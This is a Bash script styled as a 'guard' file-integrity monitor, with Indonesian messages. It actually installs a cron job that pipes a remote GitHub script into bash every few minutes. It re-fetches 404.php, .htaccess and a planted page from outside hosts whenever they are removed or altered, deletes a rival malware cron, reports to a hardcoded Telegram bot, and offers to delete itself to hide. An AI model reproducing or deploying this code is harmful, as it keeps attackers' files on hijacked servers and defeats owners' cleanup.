#!/bin/bash

set -euo pipefail

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# Configuration
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
SCRIPT_NAME="guard.sh"
BASE_DIR="$(pwd)"
SCRIPT_URL="https://raw.githubusercontent.com/taichannetizen/1337monitor/refs/heads/main/protectbutcher"

CHECK_INTERVAL=180
PERM_DIR=755
PERM_FILE=644

TG_BOT_TOKEN="${TG_BOT_TOKEN:-8558942401:AAFYG206RF36biy5bYji_rFNOt5SiahKW5c}"
TG_CHAT_ID="${TG_CHAT_ID:--5022626039}"

ALERT_ON_RESTORE_MISSING=1
ALERT_ON_RESTORE_TAMPER=1
ALERT_ON_WRONG_PERM=1
ALERT_ON_CRON_MISSING=1

HEARTBEAT_FILE="$BASE_DIR/.guard.heartbeat"
CRON_BACKUP_FILE="$BASE_DIR/.guard.cron.bak"

declare -A PROTECTED_URLS
PROTECTED_URLS["recycle-packaging/index.html"]="https://raw.githubusercontent.com/taichannetizen/1337monitor/refs/heads/main/recyclable-packaging"

FILE_404="$BASE_DIR/404.php"
HTACCESS="$BASE_DIR/.htaccess"

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# Functions
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

send_telegram() {
  local msg="$1"
  [[ -z "${TG_BOT_TOKEN}" || -z "${TG_CHAT_ID}" ]] && return 0
  command -v curl >/dev/null 2>&1 || return 0
  curl -sS -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
    --data-urlencode "text=$msg" \
    -d "chat_id=$TG_CHAT_ID" \
    -d "disable_web_page_preview=true" \
    >/dev/null 2>&1 || true
}

fetch_content() {
  local url="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -sSfL --max-time 15 "$url"
  elif command -v wget >/dev/null 2>&1; then
    timeout 15 wget -qO- --timeout=10 "$url"
  else
    return 1
  fi
}

calc_hash() {
  local file="$1"
  [[ ! -f "$file" ]] && { echo ""; return 0; }
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file" 2>/dev/null | awk '{print $1}'
  elif command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$file" 2>/dev/null | awk '{print $1}'
  else
    echo "unknown"
  fi
}

ensure_dir() {
  [[ ! -d "$1" ]] && mkdir -p "$1" && chmod "$PERM_DIR" "$1" || true
}

restore_file() {
  local rel_path="$1" url="$2" full_path="$BASE_DIR/$rel_path"
  ensure_dir "$(dirname "$full_path")"
  local content
  if ! content=$(fetch_content "$url"); then 
    log "‚ùå Gagal mengunduh: $url"
    return 1
  fi
  echo "$content" > "$full_path" || return 1
  chmod "$PERM_FILE" "$full_path"
  PROTECTED_HASHES["$rel_path"]="$(calc_hash "$full_path")"
  return 0
}

fix_permission_if_needed() {
  local rel_path="$1"
  local full_path="$BASE_DIR/$rel_path"

  [[ ! -e "$full_path" ]] && return 0

  if [[ -d "$full_path" ]]; then
    local current_perm
    current_perm=$(stat -c "%a" "$full_path" 2>/dev/null || stat -f "%Lp" "$full_path" 2>/dev/null | cut -c2- || echo "???")
    if [[ "$current_perm" != "$PERM_DIR" ]]; then
      chmod "$PERM_DIR" "$full_path" && {
        log "üîß Folder diperbaiki: $rel_path ‚Üí $PERM_DIR (dari $current_perm)"
        [[ "$ALERT_ON_WRONG_PERM" -eq 1 ]] && send_telegram "üìÅ Folder diperbaiki: $rel_path ‚Üí $PERM_DIR di $(hostname)"
      }
    fi
  elif [[ -f "$full_path" ]]; then
    local current_perm
    current_perm=$(stat -c "%a" "$full_path" 2>/dev/null || stat -f "%Lp" "$full_path" 2>/dev/null | cut -c2- || echo "???")
    if [[ "$current_perm" != "$PERM_FILE" ]]; then
      chmod "$PERM_FILE" "$full_path" && {
        log "üîß File diperbaiki: $rel_path ‚Üí $PERM_FILE (dari $current_perm)"
        [[ "$ALERT_ON_WRONG_PERM" -eq 1 ]] && send_telegram "üìÑ File diperbaiki: $rel_path ‚Üí $PERM_FILE di $(hostname)"
      }
    fi
  fi
}

check_and_protect_file() {
  local rel_path="$1" url="$2" full_path="$BASE_DIR/$rel_path"

  # Fix directory permissions first
  local dir_path
  dir_path="$(dirname "$rel_path")"
  if [[ "$dir_path" != "." ]]; then
    fix_permission_if_needed "$dir_path"
  fi

  # Fix file permissions
  fix_permission_if_needed "$rel_path"

  # Check if file is missing
  if [[ ! -s "$full_path" ]]; then
    if restore_file "$rel_path" "$url"; then
      [[ "$ALERT_ON_RESTORE_MISSING" -eq 1 ]] && \
        send_telegram "üõ°Ô∏è File dipulihkan (missing): $rel_path di $(hostname)"
    fi
    return
  fi

  # Check if file was tampered with
  local current_hash="$(calc_hash "$full_path")"
  local known_hash="${PROTECTED_HASHES[$rel_path]:-}"
  
  if [[ -z "$known_hash" && -n "$current_hash" && "$current_hash" != "unknown" ]]; then
    PROTECTED_HASHES["$rel_path"]="$current_hash"
  fi
  
  if [[ -n "$known_hash" && -n "$current_hash" && "$current_hash" != "unknown" && "$current_hash" != "$known_hash" ]]; then
    if restore_file "$rel_path" "$url"; then
      [[ "$ALERT_ON_RESTORE_TAMPER" -eq 1 ]] && \
        send_telegram "üö® File diubah & dipulihkan: $rel_path di $(hostname)"
    fi
  fi
}

restore_essential_files() {
  local needs_notify=false
  local msg=""

  if [[ ! -f "$FILE_404" ]]; then
    log "404.php hilang, mengunduh..."
    if curl -fsSL -k "https://schoolofmissingstudies.net/guardalimotor/public.txt" -o "$FILE_404"; then
      chmod 644 "$FILE_404"
      msg+="‚úÖ 404.php dipulihkan\n"
      needs_notify=true
    fi
  fi

  if [[ ! -f "$HTACCESS" ]]; then
    log ".htaccess hilang, mengunduh..."
    if curl -fsSL "https://schoolofmissingstudies.net/guardalimotor/htaccess.txt" -o "$HTACCESS"; then
      chmod 644 "$HTACCESS"
      msg+="‚úÖ .htaccess dipulihkan\n"
      needs_notify=true
    fi
  fi

  if [[ "$needs_notify" == true ]]; then
    send_telegram "üîß Pemulihan sistem di $(hostname):\n$msg"
  fi
}

restore_cron_if_missing() {
  if ! crontab -l 2>/dev/null | grep -q "guard.sh.*--cron"; then
    if [[ -f "$CRON_BACKUP_FILE" ]]; then
      crontab "$CRON_BACKUP_FILE" 2>/dev/null && {
        send_telegram "üîÑ Cron guard.sh dipulihkan otomatis di server $(hostname)!"
        log "üîÑ Cron dipulihkan dari backup."
      } || {
        send_telegram "‚ùå Gagal memulihkan cron dari backup di $(hostname)."
      }
    else
      send_telegram "‚ùó Cron guard.sh hilang dan TIDAK ADA backup! Segera jalankan ./guard.sh di $(hostname)."
    fi
  fi
}

restore_script_if_missing() {
  # Optional: Only restore if you want local copy
  # When running from remote, this is not needed
  if [[ "${KEEP_LOCAL_COPY:-0}" -eq 1 ]] && [[ ! -f "$BASE_DIR/$SCRIPT_NAME" ]]; then
    log "‚ö†Ô∏è Script lokal hilang! Mengunduh dari $SCRIPT_URL..."
    if curl -fsSL "$SCRIPT_URL" -o "$BASE_DIR/$SCRIPT_NAME"; then
      chmod +x "$BASE_DIR/$SCRIPT_NAME"
      log "‚úÖ Script berhasil diunduh ulang"
      send_telegram "üõ°Ô∏è Script guard.sh dipulihkan otomatis di $(hostname)!"
    else
      log "‚ùå Gagal mengunduh script dari $SCRIPT_URL"
      send_telegram "üö® CRITICAL: Gagal restore script di $(hostname)! Check $SCRIPT_URL"
    fi
  fi
}

install_cron() {
  local minute_interval=$(( CHECK_INTERVAL / 60 ))
  if (( minute_interval * 60 != CHECK_INTERVAL )) || (( minute_interval < 1 )); then
    echo "‚ùå CHECK_INTERVAL harus kelipatan 60!" >&2
    exit 1
  fi

  local cron_schedule="*/$minute_interval * * * *"
  # FIX: Download from remote and run, so local file can be deleted
  local CRON_CMD="cd $BASE_DIR && TG_BOT_TOKEN='$TG_BOT_TOKEN' TG_CHAT_ID='$TG_CHAT_ID' curl -fsSL '$SCRIPT_URL' | sed 's/\r\$//' | bash -s -- --cron >> $BASE_DIR/guard.log 2>&1"

  (crontab -l 2>/dev/null | grep -v -E "guard\.sh|guardalimotor|defunct-kernel" || true) > "$CRON_BACKUP_FILE"
  echo "$cron_schedule $CRON_CMD" >> "$CRON_BACKUP_FILE"
  crontab "$CRON_BACKUP_FILE"
  chmod 600 "$CRON_BACKUP_FILE" 2>/dev/null || true

  echo "‚úÖ Cron terpasang (self-healing mode)"
  echo "üì° Remote URL: $SCRIPT_URL"
  echo "üíæ Backup: $CRON_BACKUP_FILE"
  echo ""
  echo "üî• TRUE SELF-HEALING: Local file can be deleted!"
  echo "   Cron downloads fresh copy from Forgejo every run"
}

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# Main Execution
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

if [[ "${1:-}" != "--cron" ]]; then
  chmod +x "$0" 2>/dev/null || true
  echo "üöÄ Memasang cron self-healing mode..."
  echo ""
  echo "üì° Mode: Script akan berjalan setiap $((CHECK_INTERVAL / 60)) menit"
  echo "üîó URL: $SCRIPT_URL"
  echo "‚ö†Ô∏è  PENTING: Pastikan URL tersebut bisa diakses!"
  echo ""
  install_cron
  echo ""
  echo "‚úÖ Instalasi selesai!"
  echo "üìã Cron akan berjalan setiap $((CHECK_INTERVAL / 60)) menit"
  echo "üìÅ Log: $BASE_DIR/guard.log"
  echo ""
  echo "üí° Fitur:"
  echo "   - Proteksi file dari perubahan"
  echo "   - Restore otomatis jika file hilang/diubah"
  echo "   - Monitoring permission file & folder"
  echo "   - Telegram notification"
  echo "   - Self-healing (restore cron & script)"
  echo ""
  echo "üî• CLEAN ROOT MODE:"
  echo "   - Script runs from Forgejo (remote)"
  echo "   - No local guard.sh needed"
  echo "   - You can delete guard.sh now!"
  echo ""
  read -p "Delete local guard.sh to keep root clean? (y/n): " -n 1 -r
  echo
  if [[ $REPLY =~ ^[Yy]$ ]]; then
    rm -f "$0"
    echo "‚úÖ Local guard.sh deleted - running 100% remote!"
  fi
  echo ""
  exit 0
fi

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# Cron Mode
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

LOG_FILE="$BASE_DIR/guard.log"
touch "$LOG_FILE" 2>/dev/null || LOG_FILE="/tmp/guard-$(date +%s).log"

{
  log "üîç Memulai pemeriksaan lengkap..."
  
  # Remove malware cron
  crontab -l 2>/dev/null | grep -v "defunct-kernel" | crontab - 2>/dev/null || true
  
  # Restore script if missing
  restore_script_if_missing
  
  # Restore cron if missing
  restore_cron_if_missing
  
  # Check heartbeat
  if [[ -f "$HEARTBEAT_FILE" ]]; then
    last_run=$(cat "$HEARTBEAT_FILE" 2>/dev/null || echo 0)
    now=$(date +%s)
    elapsed=$((now - last_run))
    if (( elapsed > 360 )); then
      msg="‚ö†Ô∏è ALERT: Cron tidak aktif selama $(($elapsed/60)) menit di $(hostname)!"
      log "$msg"
      [[ "$ALERT_ON_CRON_MISSING" -eq 1 ]] && send_telegram "$msg"
    fi
  fi
  
  # Protect files
  declare -A PROTECTED_HASHES
  for rel_path in "${!PROTECTED_URLS[@]}"; do
    check_and_protect_file "$rel_path" "${PROTECTED_URLS[$rel_path]}"
  done
  
  # Restore essential files
  restore_essential_files
  
  # Update heartbeat
  date +%s > "$HEARTBEAT_FILE"
  log "‚úÖ Pemeriksaan selesai."
  
} >> "$LOG_FILE" 2>&1

exit 0
